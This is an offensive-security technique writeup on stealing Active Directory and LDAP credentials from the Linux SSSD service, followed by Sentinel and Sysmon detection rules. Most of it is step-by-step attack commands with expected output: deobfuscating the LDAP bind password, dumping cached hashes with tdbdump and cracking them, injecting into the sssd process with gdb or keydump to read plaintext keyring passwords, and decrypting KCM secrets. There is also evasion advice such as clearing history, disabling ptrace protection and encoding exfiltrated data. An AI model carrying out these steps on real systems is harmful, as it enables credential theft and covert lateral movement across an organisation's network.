# [CA-UNSC-002]: /etc/sssd/sssd.conf Harvesting

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CA-UNSC-002 |
| **MITRE ATT&CK v18.1** | [T1552.001 - Credentials In Files](https://attack.mitre.org/techniques/T1552/001/) |
| **Tactic** | Credential Access |
| **Platforms** | Linux/Unix |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-08 |
| **Affected Versions** | SSSD 1.9.0 - 2.9.x (all versions vulnerable) |
| **Patched In** | N/A (design limitation, requires configuration hardening) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Sections 6 (Atomic Red Team) and 8 (Splunk Detection) not included. Section 6 excluded because no published Atomic Red Team test exists for SSSD harvesting. Section 8 excluded because this is an on-premises Linux technique with no cloud-native logging that Splunk would typically index. All section numbers have been dynamically renumbered based on applicability.

---

## 1. EXECUTIVE SUMMARY

The System Security Services Daemon (SSSD) is a critical identity provider on Linux/Unix systems that authenticate against centralized directories such as Active Directory and LDAP. When configured for credential caching—a feature that enables offline authentication for mobile and remote systems—SSSD stores credential material in multiple locations on disk and in kernel keyrings. An attacker with local file system access (or local privilege escalation leading to root) can extract plaintext passwords, credential hashes, and service account credentials from three distinct attack surfaces: the SSSD configuration file (`/etc/sssd/sssd.conf`), the LDB credential cache database (`/var/lib/sss/db/`), and the kernel keyring system (when `krb5_store_password_if_offline = true`).

**Attack Surface:** Configuration files, credential cache databases, kernel keyrings, and LDB secrets files on Linux systems running SSSD with caching enabled.

**Business Impact:** **Complete compromise of all cached Active Directory and LDAP identities.** An attacker harvesting SSSD credentials gains lateral movement across the entire network using legitimate domain accounts, domain service accounts, and machine accounts. This enables domain escalation, persistence mechanisms (golden tickets, silver tickets), and wholesale exfiltration of sensitive data. The impact is often undetected for extended periods because the attacker is using legitimate credentials.

**Technical Context:** Exploitation requires local file system access or the ability to achieve local privilege escalation to root. The extraction itself is trivial (configuration file is plaintext or trivially deobfuscated; cache databases require standard tools like `tdbdump`). Detection is difficult because the attacker's authentication activity blends with normal user and service behavior. Reversibility is zero—extracted credentials cannot be "un-stolen," only rotated after detection.

### Operational Risk

- **Execution Risk:** **Critical** - Local access required, but extraction is deterministic and does not depend on version-specific defenses.
- **Stealth:** **High** - Reading files generates minimal audit trail; kernel keyring dumping via GDB leaves no standard log entries.
- **Reversibility:** **No** - Once credentials are dumped, they cannot be revoked in real-time. System reboot clears kernel keyrings but not disk-based cache.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.1 | Ensure permissions on /etc/sssd/sssd.conf are restricted (should be 0600) |
| **DISA STIG RHEL 9** | V-258133 | Must prohibit use of cached authenticators after one day |
| **DISA STIG RHEL 8** | V-230376 | Must prohibit use of cached authenticators after one day |
| **NIST 800-53** | IA-2 | Identification and Authentication (Organizational Users) |
| **NIST 800-53** | IA-5 | Authenticator Management |
| **NIST 800-53** | SC-28 | Protection of Information at Rest |
| **GDPR** | Art. 32 | Security of Processing (encryption, access control) |
| **ISO 27001** | A.10.1.1 | Cryptographic Controls |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights |
| **NIS2** | Art. 21 | Cyber Risk Management Measures (access control, monitoring) |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:** Local user with file system read access to `/etc/sssd/` and `/var/lib/sss/`, OR root/sudo privilege for kernel keyring dumping via GDB.

**Required Access:** 
- Direct file system access to target system, OR
- SSH/local shell access with privilege escalation capability, OR
- Compromised process running with sufficient privileges (CAP_SYS_PTRACE for GDB-based extraction).

**Supported Versions:**
- **Linux:** Ubuntu 18.04+ (1804, 2004, 2204), Debian 9+, RHEL 6/7/8/9, CentOS 7/8, AlmaLinux 8/9, Rocky Linux 8/9
- **SSSD:** Version 1.9.0 - 2.9.x (all active versions affected)
- **Kerberos:** krb5 1.15+
- **Tools:** bash, tar, openssl (for deobfuscation), tdbdump (optional), GDB (for keyring extraction), Python 3.6+ (for FireEye SSSDKCMExtractor)

**Exploitation Requirements:**
- Target system must have SSSD installed and configured (check: `systemctl status sssd`)
- Credential caching must be enabled: `cache_credentials = true` in `/etc/sssd/sssd.conf`
- For plaintext password extraction via keyring: `krb5_store_password_if_offline = true` (non-default, dangerous setting)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Linux Shell / Command-Line Reconnaissance

**Check if SSSD is installed and running:**
```bash
systemctl status sssd
ps aux | grep sssd
which sss_cache
```

**What to Look For:**
- Active SSSD service indicates credential caching is in use
- Presence of `/etc/sssd/sssd.conf` confirms configuration exists
- Running SSSD process indicates cache database is populated

**Check SSSD cache configuration:**
```bash
sudo cat /etc/sssd/sssd.conf | grep -E "(cache_credentials|krb5_store_password_if_offline|entry_cache_timeout|offline_credentials_expiration)"
```

**What to Look For:**
- `cache_credentials = true` - Credentials are cached locally (DANGEROUS)
- `krb5_store_password_if_offline = true` - Plaintext passwords stored in kernel keyring (CRITICAL RISK)
- `offline_credentials_expiration = 0` - Cache never expires (permanent threat)
- `entry_cache_timeout = 5400` (default) - Cache valid for 90 minutes

**Check if credential cache files exist:**
```bash
ls -la /var/lib/sss/db/
du -sh /var/lib/sss/db/
sudo file /var/lib/sss/db/*.ldb
```

**What to Look For:**
- Presence of `cache_*.ldb` files indicates cached user data
- Large file sizes (>1 MB) indicate substantial cached user/group data
- Recent modification times indicate active caching

**Check kernel keyring for stored credentials (requires root):**
```bash
sudo cat /proc/$(pgrep -u 0 sssd | head -1)/keys
```

**Version Note:** On RHEL 7/CentOS 7 and later, the default keyring provider is KCM (Kerberos Credential Manager), which stores credentials in `/var/lib/sss/secrets/secrets.ldb` (encrypted) rather than in the kernel keyring. However, if SSSD is configured with `krb5_store_password_if_offline = true`, plaintext passwords ARE stored in the session/process keyring.

**Command (RHEL 6-7, SSSD 1.x):**
```bash
sudo cat /etc/sssd/sssd.conf | head -20
```

**Command (RHEL 8-9, SSSD 2.x with KCM):**
```bash
sudo cat /etc/sssd/sssd.conf | grep -A 10 "\[domain/"
```

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Direct Configuration File Extraction (Plaintext & Obfuscated Passwords)

**Supported Versions:** SSSD 1.x - 2.x (all versions)

#### Step 1: Identify SSSD Configuration Location

**Objective:** Locate the SSSD configuration file and verify it contains credential material.

**Command:**
```bash
sudo cat /etc/sssd/sssd.conf
```

**Expected Output (Example):**
```
[sssd]
config_file_version = 2
domains = example.com, ipa.local
services = nss, pam

[domain/example.com]
id_provider = ad
auth_provider = ad
access_provider = ad
ad_server = dc1.example.com
ad_domain = example.com
use_fully_qualified_names = True
cache_credentials = True
krb5_store_password_if_offline = True

[domain/ipa.local]
id_provider = ipa
ipa_server = ipa.example.com
ldap_uri = ldap://ldap.example.com
ldap_default_authtok_type = obfuscated_password
ldap_default_authtok = AAAQABOzVAjf9KgUyIxTw3A+HUfbig7N1+L0qtY4xAULt2GYHFc1B3CBWGAE9ArooklBkpxQtROiyCGDQH+VzLHYmiIAAQID
```

**What This Means:**
- The `ldap_default_authtok` field contains an obfuscated (base64-encoded) password used by SSSD to bind to the LDAP directory
- The `cache_credentials = True` setting indicates credentials are cached locally
- The `krb5_store_password_if_offline = True` setting indicates plaintext passwords are stored in the kernel keyring

**OpSec & Evasion:**
- Reading `/etc/sssd/sssd.conf` as a non-root user will be denied (file is 0600 root:root), but can be read once root is obtained
- Process listing `/etc/sssd/` directory reads will appear in file access audits (auditd)
- **Evasion:** Copy the file to `/tmp` to avoid repeated access logs; use base64 encoding for exfiltration to avoid detection of credential strings in network logs

**Troubleshooting:**
- **Error:** `Permission denied`
  - **Cause:** File is readable only by root
  - **Fix:** Obtain root privileges via sudo, ssh as root, or local exploit
- **Error:** File does not exist
  - **Cause:** SSSD not installed or using non-standard configuration path
  - **Fix:** Check if SSSD is running; check `/etc/sssd/conf.d/` for configuration snippets

**References & Proofs:**
- [Red Hat SSSD Configuration](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/9/html/configuring_and_managing_identity_management/assembly_implementing_sssd_for_system_authentication_configuring-sssd_system-authentication-using-sssd)
- [SSSD Configuration File Documentation](https://www.systutorials.com/docs/linux/man/5-sssd.conf/)

#### Step 2: Extract and Deobfuscate Stored Credentials

**Objective:** Extract the obfuscated LDAP password and convert it to plaintext.

**Identifying Obfuscated Credentials:**
```bash
grep "ldap_default_authtok" /etc/sssd/sssd.conf
```

**Expected Output:**
```
ldap_default_authtok = AAAQABOzVAjf9KgUyIxTw3A+HUfbig7N1+L0qtY4xAULt2GYHFc1B3CBWGAE9ArooklBkpxQtROiyCGDQH+VzLHYmiIAAQID
```

**Deobfuscate using sss_deobfuscate:**
```bash
# Download the tool
git clone https://github.com/mludvig/sss_deobfuscate.git
cd sss_deobfuscate

# Deobfuscate the credential
./sss_deobfuscate AAAQABOzVAjf9KgUyIxTw3A+HUfbig7N1+L0qtY4xAULt2GYHFc1B3CBWGAE9ArooklBkpxQtROiyCGDQH+VzLHYmiIAAQID
```

**Expected Output:**
```
LdapServicePassword123!
```

**What This Means:**
- The plaintext LDAP service account password has been extracted
- This password can now be used to authenticate against the LDAP directory, the AD domain, or any systems where this service account is granted privileges
- The account is typically a dedicated LDAP bind account with cross-forest or cross-domain permissions

**OpSec & Evasion:**
- The deobfuscation algorithm is deterministic and does not require network access
- Run the extraction offline after exfiltrating the config file
- **Evasion:** Do not execute `sss_deobfuscate` on the target system; extract the obfuscated string and deobfuscate on an attacker-controlled machine

**Troubleshooting:**
- **Error:** `sss_deobfuscate: command not found`
  - **Cause:** Tool not installed
  - **Fix:** Download from GitHub, or use the Python equivalent (if available)
- **Error:** Deobfuscation returns garbage
  - **Cause:** Obfuscated string is corrupt or truncated
  - **Fix:** Copy the entire base64 string without newlines; verify with `echo -n "..."` before passing to deobfuscate

**References & Proofs:**
- [sss_deobfuscate GitHub](https://github.com/mludvig/sss_deobfuscate)
- [InternalAllTheThings - AD Linux Extraction](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-linux/)

---

### METHOD 2: Credential Cache Database Extraction (Cached Hashes)

**Supported Versions:** SSSD 1.x - 2.x (all versions)

#### Step 1: Identify and Extract LDB Cache Files

**Objective:** Export the LDB database files containing cached credential hashes and identity information.

**Locate cache files:**
```bash
sudo ls -la /var/lib/sss/db/
sudo file /var/lib/sss/db/*.ldb
```

**Expected Output:**
```
-rw------- 1 root root 1572864 Jan  8 10:34 cache_example.com.ldb
-rw------- 1 root root 2097152 Jan  8 10:34 cache_ipa.local.ldb
-rw------- 1 root root 1048576 Jan  8 10:34 timestamps_example.com.ldb
```

**What This Means:**
- Each domain configured in SSSD has a corresponding `cache_DOMAIN.ldb` file
- These are LDB (LDAP Database) files in a simple binary format
- The cache contains all user records, group records, sudo rules, and cached authentication hashes

#### Step 2: Extract Hashes Using tdbdump (if available)

**Objective:** Parse the LDB database and extract cached credential hashes.

**Check if tdbdump is installed:**
```bash
which tdbdump
```

**If not installed:**
```bash
# Ubuntu/Debian
sudo apt-get install tdb-tools

# RHEL/CentOS
sudo yum install tdb-tools
```

**Extract hashes from cache:**
```bash
sudo tdbdump /var/lib/sss/db/cache_example.com.ldb
```

**Expected Output (truncated):**
```
[key]: CN=john.doe,CN=users,DC=example,DC=com
[data]: {
  uid:10001
  gidNumber:513
  name:john.doe@example.com
  cachedPassword: $6$rounds=656000$XXXXXXXX$YYYYYYYYYYYYYY... (SHA-512 crypt hash)
}

[key]: CN=Domain Admins,CN=builtin,DC=example,DC=com
[data]: {
  gidNumber:512
  name:Domain Admins@example.com
  members: CN=Administrator,CN=users,DC=example,DC=com
}
```

**What This Means:**
- The `cachedPassword` field contains a salted SHA-512 hash of the user's password
- These hashes can be cracked offline using Hashcat or John the Ripper
- Group membership information reveals privilege escalation targets

**OpSec & Evasion:**
- Running `tdbdump` on the target system will be logged in auditd if file access auditing is enabled
- **Evasion:** Copy the LDB file to `/tmp` and use `tdbdump` on a single read, then delete the temp copy
- **Better Evasion:** Tar the entire `/var/lib/sss/db/` directory and exfiltrate for offline analysis

#### Step 3: Crack Extracted Hashes

**Objective:** Convert cached hashes to plaintext passwords.

**Using Hashcat (GPU acceleration):**
```bash
hashcat -m 1800 hashes.txt wordlist.txt
```

**Using John the Ripper:**
```bash
john hashes.txt --format=sha512crypt --wordlist=wordlist.txt
```

**Expected Success Rate:** 30-60% on enterprise networks (password reuse, weak passwords common in legacy domains)

**References & Proofs:**
- [SSSD-creds GitHub Tool](https://github.com/ricardojoserf/SSSD-creds)
- [Payatu - Credential Dumping in Linux](https://payatu.com/blog/credential-dumping-in-linux/)

---

### METHOD 3: Kernel Keyring Extraction (Plaintext Passwords via krb5_store_password_if_offline)

**Supported Versions:** SSSD 1.x - 2.x (when `krb5_store_password_if_offline = true`)

**Preconditions:** This method only works if the SSSD configuration contains `krb5_store_password_if_offline = true`, which explicitly enables plaintext password storage in the kernel keyring. This is a non-default, explicitly dangerous configuration option.

#### Step 1: Identify Processes with Plaintext Passwords in Keyring

**Objective:** Locate the SSSD process and determine if plaintext credentials are stored in its session keyring.

**Get SSSD process PID:**
```bash
ps aux | grep sssd | grep -v grep
sudo pgrep -u 0 sssd | head -1
```

**Expected Output:**
```
root       1234     1  0 10:00 ?        Ss     0:05 /usr/sbin/sssd -i
```

**Verify krb5_store_password_if_offline is enabled:**
```bash
sudo grep "krb5_store_password_if_offline" /etc/sssd/sssd.conf
```

**Expected Output (if vulnerable):**
```
krb5_store_password_if_offline = true
```

**What This Means:**
- When a user authenticates, SSSD explicitly stores their plaintext password in the kernel keyring
- The keyring is session-scoped and only accessible by the SSSD process and privileged users
- This is a critical misconfiguration because Kerberos credentials should never be stored in plaintext

#### Step 2: Dump Keyring Using GDB

**Objective:** Inject a payload into the SSSD process to dump all keys from its keyring.

**Method A: Using GDB (Interactive)**

**Attach to SSSD process:**
```bash
sudo gdb -p $(pgrep -u 0 sssd | head -1)
(gdb) call system("keyctl show > /tmp/keyring_dump.txt")
(gdb) quit
cat /tmp/keyring_dump.txt
```

**Expected Output:**
```
Session Keyring
  237034099 --alswrv     0     0  keyring: _ses
  689325199 --alswrv     0     0  \_ user: john.doe@example.com
  591823745 --alswrv     0     0  \_ user: admin@example.com
```

**Extract plaintext password from specific key:**
```bash
sudo gdb -p $(pgrep -u 0 sssd | head -1)
(gdb) call system("keyctl print 689325199 > /tmp/password.txt")
(gdb) quit
cat /tmp/password.txt
```

**Expected Output:**
```
P@ssw0rd123!
```

**What This Means:**
- The plaintext password for the user `john.doe@example.com` has been extracted
- This password is identical to the user's actual AD password
- The password is now available for use in lateral movement, privilege escalation, or credential stuffing attacks

**Method B: Using keydump Tool (Automated)**

**Download and compile keydump:**
```bash
git clone https://github.com/hackliza/keydump.git
cd keydump
make
```

**Execute keydump against SSSD:**
```bash
ps -o pid --no-headers -C sssd | sed 's/ //g' | sudo ./keydump -
```

**Expected Output:**
```
[PID 1234] Shellcode injected
[PID 1234] /tmp/k_1234 exists, so keys must be dumped!!
ls /tmp/k_1234/
```

**Extract plaintext passwords:**
```bash
sudo cat /tmp/k_1234/*
```

**OpSec & Evasion:**
- GDB attachment creates a process trace, which may trigger process monitoring (EDR, auditd)
- The target SSSD process is briefly paused during GDB attachment
- **Evasion:** Perform the extraction quickly; use keydump for stealth (injects shellcode directly without external debugger)
- **Detection Evasion:** Clean up `/tmp/k_*` directories after extraction; clear bash history

**Troubleshooting:**
- **Error:** `ptrace: Operation not permitted`
  - **Cause:** User lacks CAP_SYS_PTRACE capability or YAMA ptrace_scope prevents attaching
  - **Fix (Server 2016 equivalent - Linux):** `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` (temporarily allows ptrace)
  - **Fix (Permanent):** Modify `/etc/sysctl.d/10-ptrace.conf` and set `kernel.yama.ptrace_scope = 0` (DANGEROUS)
  
- **Error:** `gdb: command not found`
  - **Cause:** GDB not installed
  - **Fix:** `sudo apt-get install gdb` (Debian/Ubuntu) or `sudo yum install gdb` (RHEL/CentOS)

- **Error:** No keys appear in keyring dump
  - **Cause:** SSSD process not caching passwords, or user has not logged in yet
  - **Fix:** Trigger an authentication by attempting SSH login; wait 10-15 seconds; retry keyring dump

**References & Proofs:**
- [Hackliza - keydump Tool](https://hackliza.gal/en/posts/keydump/)
- [keydump GitHub](https://github.com/hackliza/keydump)

---

### METHOD 4: SSSD KCM Secrets Extraction (Encrypted Cache)

**Supported Versions:** SSSD 2.x (default credential manager on RHEL 8+, Ubuntu 20.04+)

**Preconditions:** KCM (Kerberos Credential Manager) is the default in modern SSSD versions. Credentials stored in `/var/lib/sss/secrets/secrets.ldb` are encrypted with a master key stored in `.secrets.mkey`.

#### Step 1: Extract Encrypted Secrets Database

**Objective:** Export the encrypted secrets database and master key for offline decryption.

**Locate secrets files:**
```bash
sudo ls -la /var/lib/sss/secrets/
```

**Expected Output:**
```
-rw------- 1 root root   8192 Jan  8 10:34 secrets.ldb
-rw------- 1 root root   32 Jan  8 10:34 .secrets.mkey
```

**Copy secrets database and key:**
```bash
sudo tar czf /tmp/sssd_secrets.tar.gz /var/lib/sss/secrets/
sudo chown $USER /tmp/sssd_secrets.tar.gz
tar tzf /tmp/sssd_secrets.tar.gz
```

**What This Means:**
- The `secrets.ldb` file contains encrypted Kerberos credentials, Kerberos service accounts, and cached LDAP credentials
- The `.secrets.mkey` file contains the encryption key (32 bytes)
- Together, these files allow offline decryption of all cached credentials

#### Step 2: Decrypt Using SSSDKCMExtractor

**Objective:** Decrypt the secrets database using the master key.

**Download SSSDKCMExtractor (FireEye tool):**
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor.git
cd SSSDKCMExtractor
pip install pycryptodomex python-ldb
```

**Extract and decrypt:**
```bash
# Copy the extracted files
cp /path/to/extracted/secrets.ldb .
cp /path/to/extracted/.secrets.mkey .

# Run extractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key .secrets.mkey
```

**Expected Output:**
```
[+] Loading database...
[+] Decrypting secrets...
[*] Service Account: svc-sssd@example.com | Hash: XXXXX | Password: S3cr3t!
[*] User: john.doe@example.com | TGT: krb5 ticket blob...
[*] User: admin@example.com | TGT: krb5 ticket blob...
```

**What This Means:**
- All Kerberos Ticket Granting Tickets (TGTs) cached in the KCM have been extracted
- Service account passwords have been recovered
- TGTs can be converted to CCACHE files and reused via Pass-the-Ticket (PTT) attacks

**Converting Extracted TGT to CCACHE:**
```bash
# Use bifrost (macOS) or other tools to convert the TGT blob to a usable .ccache file
# Then use with:
export KRB5CCNAME=/path/to/ticket.ccache
kinit -c $KRB5CCNAME <username>
```

**References & Proofs:**
- [FireEye SSSDKCMExtractor](https://github.com/fireeye/SSSDKCMExtractor)
- [InternalAllTheThings - CCACHE from KCM](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-linux/)

---

## 5. Attack Simulation & Verification

### Atomic Red Team Test Alternative

While no official Atomic Red Team test exists for SSSD harvesting, the following manual simulation replicates the attack:

#### Simulation Test 1: Configuration File Access

**Objective:** Simulate extraction of SSSD configuration file.

**Test Command:**
```bash
# Step 1: Check file permissions
stat /etc/sssd/sssd.conf

# Step 2: Read configuration (requires root)
sudo cat /etc/sssd/sssd.conf > /tmp/sssd.conf.bak

# Step 3: Extract credential fields
grep -i "authtok\|password" /tmp/sssd.conf.bak
```

**Success Criteria:**
- File is readable only by root (mode 0600)
- Configuration contains `ldap_default_authtok` or plaintext passwords
- Extraction succeeds with root privileges

**Cleanup Command:**
```bash
rm /tmp/sssd.conf.bak
```

#### Simulation Test 2: Cache Database Extraction

**Objective:** Simulate extraction of credential hashes from SSSD cache.

**Test Command:**
```bash
# Step 1: Install tdbdump if missing
sudo apt-get install tdb-tools -y

# Step 2: List cache files
sudo ls /var/lib/sss/db/cache_*.ldb

# Step 3: Dump cache (requires root)
sudo tdbdump /var/lib/sss/db/cache_*.ldb 2>/dev/null | head -50
```

**Success Criteria:**
- Cache files exist and contain data
- `tdbdump` extracts user records with salted hashes
- Hashes are in SHA-512 crypt format (`$6$rounds=...`)

**Cleanup Command:**
```bash
# No changes made; no cleanup needed
```

#### Simulation Test 3: Keyring Dump (if krb5_store_password_if_offline enabled)

**Objective:** Simulate plaintext password extraction from kernel keyring.

**Test Command (Requires root and krb5_store_password_if_offline=true):**
```bash
# Step 1: Verify configuration
sudo grep "krb5_store_password_if_offline" /etc/sssd/sssd.conf

# Step 2: Trigger an authentication (if needed)
# SSH to the system with a domain user account

# Step 3: Get SSSD PID
SSSD_PID=$(sudo pgrep -u 0 sssd | head -1)
echo "SSSD PID: $SSSD_PID"

# Step 4: Dump keyring (requires GDB)
sudo gdb -p $SSSD_PID -ex "call system(\"keyctl show | head -20\")" -ex "quit" 2>/dev/null
```

**Success Criteria:**
- `krb5_store_password_if_offline` is set to true
- Keyring dump shows user keys with readable passwords
- Plaintext passwords are visible

**Cleanup Command:**
```bash
# Remove any temporary keyring dumps
rm -f /tmp/keyring_dump.txt /tmp/password.txt /tmp/k_*
```

**References:** [Atomic Red Team T1552.001](https://www.atomicredteam.io/atomic-red-team/atomics/T1552.001)

---

## 6. Tools & Commands Reference

### sss_deobfuscate

**Source:** [GitHub - mludvig/sss_deobfuscate](https://github.com/mludvig/sss_deobfuscate)

**Version:** 1.0+

**Supported Platforms:** Linux (any distribution with Python)

**Version-Specific Notes:**
- Works on all SSSD obfuscation algorithms (1.x and 2.x)
- Deterministic deobfuscation; no network access required
- Python 3.6+ recommended

**Installation:**
```bash
git clone https://github.com/mludvig/sss_deobfuscate.git
cd sss_deobfuscate
chmod +x sss_deobfuscate
```

**Usage:**
```bash
./sss_deobfuscate AAAQABOzVAjf9KgUyIxTw3A+HUfbig7N1+L0qtY4xAULt2GYHFc1B3CBWGAE9ArooklBkpxQtROiyCGDQH+VzLHYmiIAAQID
```

**Expected Output:**
```
LdapServicePassword123!
```

---

### SSSD-creds

**Source:** [GitHub - ricardojoserf/SSSD-creds](https://github.com/ricardojoserf/SSSD-creds)

**Version:** Latest

**Supported Platforms:** Linux (Bash script)

**Installation:**
```bash
git clone https://github.com/ricardojoserf/SSSD-creds.git
cd SSSD-creds
```

**Usage:**
```bash
sudo bash analyze.sh /var/lib/sss/db/
```

**Expected Output:**
```
[+] Found cache_example.com.ldb
[+] Extracting hashes...
john.doe:$6$rounds=656000$abcd1234$XXXXX...
admin:$6$rounds=656000$efgh5678$YYYYY...
```

**Optional:** Install tdbdump for automated extraction:
```bash
apt-get install tdb-tools
bash analyze.sh /var/lib/sss/db/
```

---

### keydump

**Source:** [GitHub - hackliza/keydump](https://github.com/hackliza/keydump)

**Version:** Latest

**Supported Platforms:** Linux (requires x86_64 architecture)

**Version-Specific Notes:**
- Requires `libkeyutils` development libraries
- Architecture: compiled binary (portable across libc versions)

**Installation:**
```bash
git clone https://github.com/hackliza/keydump.git
cd keydump
make
```

**Usage:**
```bash
# Find SSSD process ID
SSSD_PID=$(pgrep -u 0 sssd | head -1)

# Run keydump
sudo ./keydump $SSSD_PID

# Extract plaintext passwords
sudo cat /tmp/k_${SSSD_PID}/*
```

---

### SSSDKCMExtractor

**Source:** [GitHub - fireeye/SSSDKCMExtractor](https://github.com/fireeye/SSSDKCMExtractor)

**Version:** Latest

**Supported Platforms:** Linux/macOS (Python 3)

**Installation:**
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor.git
cd SSSDKCMExtractor
pip install pycryptodomex python-ldb
```

**Usage:**
```bash
python3 SSSDKCMExtractor.py --database /var/lib/sss/secrets/secrets.ldb --key /var/lib/sss/secrets/.secrets.mkey
```

**Expected Output:**
```
[+] Decrypting service account credentials...
[+] Extracting Kerberos TGTs...
```

---

### tdbdump

**Source:** TDB Tools package (standard Linux tools)

**Installation:**
```bash
# Ubuntu/Debian
apt-get install tdb-tools

# RHEL/CentOS
yum install tdb-tools
```

**Usage:**
```bash
tdbdump /var/lib/sss/db/cache_*.ldb
```

---

## 7. Microsoft Sentinel Detection

#### Query 1: Suspicious Access to SSSD Configuration Files

**Rule Configuration:**
- **Required Table:** `SecurityEvent` (if Defender for Endpoint enabled) or `Syslog` (auditd logs)
- **Required Fields:** `ObjectName`, `AccessMask`, `SubjectUserName`, `TimeGenerated`
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Linux with auditd enabled

**KQL Query:**
```kusto
SecurityEvent
| where ObjectName contains "/etc/sssd/sssd.conf"
| where AccessMask has "4424" or AccessMask has "2032"  // Read/Query access
| where SubjectUserName !in ("SYSTEM", "root", "sssd")  // Exclude expected readers
| summarize AccessCount = count() by Computer, SubjectUserName, TimeGenerated
| where AccessCount > 3
| project TimeGenerated, Computer, SubjectUserName, AccessCount
```

**Alternative KQL (Using Syslog):**
```kusto
Syslog
| where ProcessName has "cat" or ProcessName has "grep" or ProcessName has "head"
| where SyslogMessage contains "/etc/sssd/sssd.conf"
| summarize EventCount = count() by Computer, ProcessId, HostIP
| where EventCount > 1
```

**What This Detects:**
- Non-privileged users attempting to read SSSD configuration
- Repeated access to configuration files (indicative of exfiltration)
- Command-line tools (cat, grep, head) accessing sensitive SSSD paths

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Suspicious SSSD Configuration Access`
   - Severity: `Critical`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `30 minutes`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group related alerts: `Enabled`
7. Click **Review + create** → **Create**

---

#### Query 2: Access to SSSD Cache Databases (/var/lib/sss/db/)

**Rule Configuration:**
- **Required Table:** `SecurityEvent` or `Syslog`
- **Required Fields:** `ObjectName`, `EventID`, `SubjectUserName`
- **Alert Severity:** High
- **Frequency:** Real-time (every 1 minute)
- **Applies To Versions:** Linux with auditd, Windows with WMI audit

**KQL Query (Auditd-based):**
```kusto
Syslog
| where ProcessName has "tdbdump" or ProcessName has "ldb" or ProcessName has "sqlite3"
| where SyslogMessage contains "/var/lib/sss/db" or SyslogMessage contains "cache_*.ldb"
| summarize EventCount = count() by Computer, ProcessId, User = iff(ProcessName has "sudo", "root", User)
| where EventCount >= 1
| project Computer, ProcessId, User, EventCount
```

**KQL Query (Splunk/Linux auditd via CommonSecurityLog or CustomLog):**
```kusto
CommonSecurityLog
| where DeviceAction contains "open" or DeviceAction contains "read"
| where FilePath contains "/var/lib/sss/db/" or FileName contains "cache_"
| where UserName !in ("root", "sssd")
| project TimeGenerated, SourceIP, UserName, DeviceAction, FilePath
```

**What This Detects:**
- Processes accessing SSSD cache databases (tdbdump, ldb tools)
- Non-root users attempting to read `/var/lib/sss/db/`
- File access to LDB database files

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

$query = @"
Syslog
| where ProcessName has "tdbdump" or ProcessName contains "ldb"
| where SyslogMessage contains "/var/lib/sss/db"
"@

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup `
  -WorkspaceName $WorkspaceName `
  -DisplayName "SSSD Cache Database Access Attempt" `
  -Query $query `
  -Severity "High" `
  -Enabled $true
```

---

#### Query 3: Kernel Keyring Dump via GDB (Process Injection)

**Rule Configuration:**
- **Required Table:** `SecurityEvent` or `Syslog` (with process tracing enabled)
- **Required Fields:** `ProcessName`, `ProcessId`, `ParentProcessId`, `CommandLine`
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To Versions:** Linux with Sysmon or enhanced auditd

**KQL Query:**
```kusto
SecurityEvent
| where ProcessName contains "gdb" or CommandLine contains "ptrace"
| where (CommandLine contains "-p " and CommandLine contains "sssd") or CommandLine contains "keyctl"
| project TimeGenerated, Computer, ProcessId, CommandLine, SubjectUserName
| summarize EventCount = count() by Computer, SubjectUserName
| where EventCount >= 1
```

**Syslog Alternative:**
```kusto
Syslog
| where ProcessName contains "gdb"
| where SyslogMessage contains "sssd" or SyslogMessage contains "keyctl"
| project TimeGenerated, SourceIP, Facility, SyslogMessage
```

**What This Detects:**
- GDB attachment to SSSD process
- Calls to `keyctl` for keyring manipulation
- Process tracing (ptrace) syscalls against SSSD

---

## 8. Windows Event Log Monitoring (N/A - Linux Only)

**Note:** SSSD is a Linux/Unix technology and does not generate Windows Event Log entries. However, if a Windows system is monitoring a Linux system (e.g., via WMI, remote syslog forwarding, or EDR agents), the Windows Security Log would record remote access to the Linux file system. This section is not applicable for native SSSD attacks.

---

## 9. Sysmon Detection Patterns

**Minimum Sysmon Version:** 13.0+ with Linux support (Sysmon for Linux)

**Supported Platforms:** Linux (with Sysmon for Linux agent installed)

**Sysmon XML Config Snippet:**

```xml
<!-- Detect file access to SSSD configuration and cache -->
<RuleGroup name="SSSD" groupRelation="or">
  <FileCreate onmatch="include">
    <TargetFilename condition="contains">/etc/sssd/</TargetFilename>
    <TargetFilename condition="contains">/var/lib/sss/</TargetFilename>
  </FileCreate>
  <FileAccess onmatch="include">
    <TargetFilename condition="contains">/etc/sssd/sssd.conf</TargetFilename>
    <TargetFilename condition="contains">/var/lib/sss/db/</TargetFilename>
    <TargetFilename condition="contains">/var/lib/sss/secrets/</TargetFilename>
  </FileAccess>
  <ProcessCreate onmatch="include">
    <CommandLine condition="contains">tdbdump</CommandLine>
    <CommandLine condition="contains">keyctl</CommandLine>
    <CommandLine condition="contains">gdb</CommandLine>
    <CommandLine condition="contains">sss_deobfuscate</CommandLine>
  </ProcessCreate>
</RuleGroup>
```

**Manual Configuration Steps:**

